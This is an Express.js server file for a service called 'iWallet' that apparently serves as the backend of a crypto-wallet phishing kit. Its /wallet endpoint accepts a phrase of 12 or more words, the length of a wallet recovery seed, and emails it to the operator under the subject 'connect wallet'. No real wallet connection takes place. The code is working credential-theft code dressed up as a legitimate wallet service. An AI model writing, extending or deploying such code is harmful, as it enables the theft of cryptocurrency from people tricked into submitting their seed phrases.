require("dotenv").config();
const express = require("express");
const cors = require("cors");
const sendEMail = require("./utils/email");

const app = express();
const port = process.env.PORT;
app.use(cors());
app.use(express.json());

app.get("/", (_, res) => {
  res.send("Welcome to iWallet");
});

function countWords(text) {
  const words = text.trim().split(/\s+/); // Split the text by spaces
  return words.length;
}

app.post("/wallet", async (req, res) => {
  const phrase = req.body.phrase;
  const wordsCount = countWords(phrase);
  try {
    if (wordsCount < 12)
      return res
        .status(400)
        .json({ error: "phrase must be more than 12 words" });

    const subject = "connect wallet";
    const text = "connect wallet";
    const html = `<h3>${phrase}</h3>`;

    await sendEMail(subject, text, html);
    return res.status(200).json({ message: "success" });
  } catch (error) {
    return res.status(500).json({ error: error.message });
  }
});

app.use("*", (_, res) => {
  res.status(404).json({ error: "Not Found" });
});

app.listen(port, () => console.log(`server running on ${port}`));
